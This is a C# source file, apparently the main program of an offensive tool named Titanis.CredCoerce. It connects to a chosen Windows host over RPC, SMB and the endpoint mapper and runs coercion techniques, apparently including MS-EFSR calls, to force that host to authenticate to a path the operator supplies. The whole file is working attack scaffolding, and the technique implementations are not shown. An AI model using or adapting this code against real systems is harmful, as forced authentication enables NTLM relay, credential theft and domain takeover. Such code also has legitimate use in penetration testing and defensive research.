using ms_efsr;
using System.ComponentModel;
using System.Net;
using System.Reflection;
using Titanis;
using Titanis.Cli;
using Titanis.DceRpc;
using Titanis.DceRpc.Client;
using Titanis.DceRpc.Epm;
using Titanis.Msrpc;
using Titanis.Msrpc.Msefsr;
using Titanis.Net;
using Titanis.Security;
using Titanis.Security.Ntlm;
using Titanis.Smb2;
using Titanis.Winterop.Security;

namespace Titanis.CredCoerce
{
	/// <task>Coerce a system to authenticate to a remote target</task>
	[Command]
	[Description("Sends RPC calls to coerce a system to authenticate to a remote system")]
	internal class Program : Command
	{
		[ParameterGroup(ParameterGroupOptions.Required | ParameterGroupOptions.AlwaysInstantiate)]
		public AuthenticationParameters Authentication { get; set; }

		[ParameterGroup(ParameterGroupOptions.Required | ParameterGroupOptions.AlwaysInstantiate)]
		public NetworkParameters NetworkParameters { get; set; }

		[Parameter(0)]
		[Mandatory]
		[Description("Name of computer to coerce")]
		public string ServerName { get; set; }

		[Parameter(10)]
		[Mandatory]
		[Description("Path to send in RPC call")]
		public string VictimPath { get; set; }

		[Parameter]
		[Mandatory]
		[Description("List of coercion techniques to attempt")]
		public ComponentSelector<CoercionTechnique>[] Techniques { get; set; }

		protected override void ValidateParameters(ParameterValidationContext context)
		{
			base.ValidateParameters(context);

			this.Authentication.Validate(true, context, this.Log);
			this.NetworkParameters.ValidateParameters(context);
		}

		static void Main(string[] args)
			=> RunProgramAsync<Program>(args);

		protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
		{
			// Initialize services
			var socketService = Singleton.SingleInstance<PlatformSocketService>();

			// Create RPC client
			RpcClient rpcClient = new RpcClient(socketService: socketService)
			{
				DefaultAuthLevel = RpcAuthLevel.PacketPrivacy,
				ConnectTimeout = TimeSpan.FromSeconds(60)
			};

			// Look up host address
			var hostAddress = await this.NetworkParameters.ResolveAsync(this.ServerName, cancellationToken);

			// Set up credentials
			ServicePrincipalName targetSpn = new(this.ServerName, ServiceClassNames.Host);
			var credService = this.Authentication.GetCredentialServiceFor(targetSpn, SecurityCapabilities.Confidentiality | SecurityCapabilities.Integrity, this.Log);

			// Set up SMB for named pipes
			var smbClient = new Smb2Client(credService, socketService: socketService);

			// Set up EPM
			using var epm = new EpmClient();
			await rpcClient.ConnectTcp(epm, new IPEndPoint(hostAddress[0], EpmClient.EPMapperPort), cancellationToken, null);
			var context = new CoercionContext(this, credService, smbClient, rpcClient, epm, this.Log);

			ArgumentNullException.ThrowIfNull(context);



			List<ComponentInfo> techs = new List<ComponentInfo>();
			ComponentCatalog.DiscoverComponents(Assembly.GetExecutingAssembly(), MetadataResolver.Default, techs);
			foreach (var techInfo in techs)
			{
				this.WriteTaskStart($"Attempting technique {techInfo.Tag}");
				try
				{
					var tech = (CoercionTechnique)Activator.CreateInstance(techInfo.ImplementingType, true);

					await tech.Execute(context, cancellationToken);
					context.Log.MarkTaskComplete();
				}
				catch (Exception ex)
				{
					context.Log.WriteTaskError(ex);
				}
			}

			return 0;
		}
	}
}
